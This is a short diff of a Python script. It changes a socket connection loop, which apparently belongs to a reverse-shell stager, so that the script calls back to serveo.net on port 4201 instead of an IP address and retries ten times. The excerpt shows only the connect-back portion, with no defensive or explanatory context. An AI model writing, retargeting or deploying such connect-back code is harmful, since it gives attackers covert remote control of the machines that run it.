@@ -6,7 +6,7 @@ import socket,struct,time
 for x in range(10):
         try:
                 s=socket.socket(2,socket.SOCK_STREAM)
-                s.connect(('52.14.61.47',15232))
+                s.connect(('serveo.net',4201))
                 break
         except:
                 time.sleep(5)
